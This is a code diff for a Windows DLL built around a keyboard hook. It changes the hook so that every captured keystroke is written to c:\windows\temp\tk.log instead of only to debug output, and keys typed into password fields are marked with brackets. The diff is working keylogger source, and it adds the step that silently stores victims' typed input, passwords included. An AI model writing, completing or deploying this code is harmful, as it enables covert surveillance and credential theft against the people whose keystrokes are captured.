@@ -3,7 +3,7 @@
 
 
 bool shift = false;
-
+HANDLE file_handle = INVALID_HANDLE_VALUE;
 HWND get_current_window()
 {
     HWND current_window = GetForegroundWindow();
@@ -120,11 +120,20 @@ LRESULT CALLBACK HookProcedure(
         OutputDebugStringA(key);
         OutputDebugStringA("\n");
     }
-	
+
+    const DWORD file_size = GetFileSize(file_handle, NULL);
+    SetFilePointer(file_handle, file_size, NULL, FILE_BEGIN);
 	if (is_password)
 	{
-        OutputDebugStringA("Password!!!\n");
-	}
+        WriteFile(file_handle, "[", 1, NULL, NULL);
+    }
+
+    WriteFile(file_handle, key, 1, NULL, NULL);
+
+    if (is_password)
+    {
+        WriteFile(file_handle, "]", 1, NULL, NULL);
+    }
 	
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
@@ -137,6 +146,16 @@ BOOL WINAPI DllMain(
     switch (fdwReason)
     {
     case DLL_PROCESS_ATTACH:
+        file_handle = CreateFileA(R"(c:\windows\temp\tk.log)", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    	if (file_handle != INVALID_HANDLE_VALUE)
+    	{
+            OutputDebugStringA("Open log file\n");
+    	}
+        else
+        {
+            OutputDebugStringA("Fail open log file\n");
+            OutputDebugStringA(std::to_string(GetLastError()).c_str());
+        }
         break;
 
     case DLL_THREAD_ATTACH:
@@ -146,6 +165,7 @@ BOOL WINAPI DllMain(
         break;
 
     case DLL_PROCESS_DETACH:
+        CloseHandle(file_handle);
         break;
     }
     return TRUE;
